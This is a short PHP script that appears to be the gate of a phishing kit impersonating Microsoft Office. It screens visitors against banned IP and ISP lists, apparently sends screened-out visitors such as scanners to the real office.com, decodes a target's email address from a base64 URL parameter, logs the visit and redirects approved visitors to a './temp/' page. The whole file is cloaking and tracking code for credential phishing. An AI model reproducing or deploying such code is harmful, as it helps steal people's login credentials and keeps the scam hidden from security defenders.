<?php

error_reporting(E_ERROR | E_PARSE);
session_start();
require('funcs/funcs.php');

$_SESSION['Count'] = countup();
$IP = IP();

CheckBannedIP($IP);
$HostName = HostName($IP);
CheckBannedISP($HostName, $IP);
CheckIFResult($IP, "https://www.office.com");
SetDetails($IP);

$_SESSION['email'] = base64_decode($_GET['e']);
LogVisitor();
$_SESSION['approved'] = "yes";
header('Location: ./temp/');
exit;
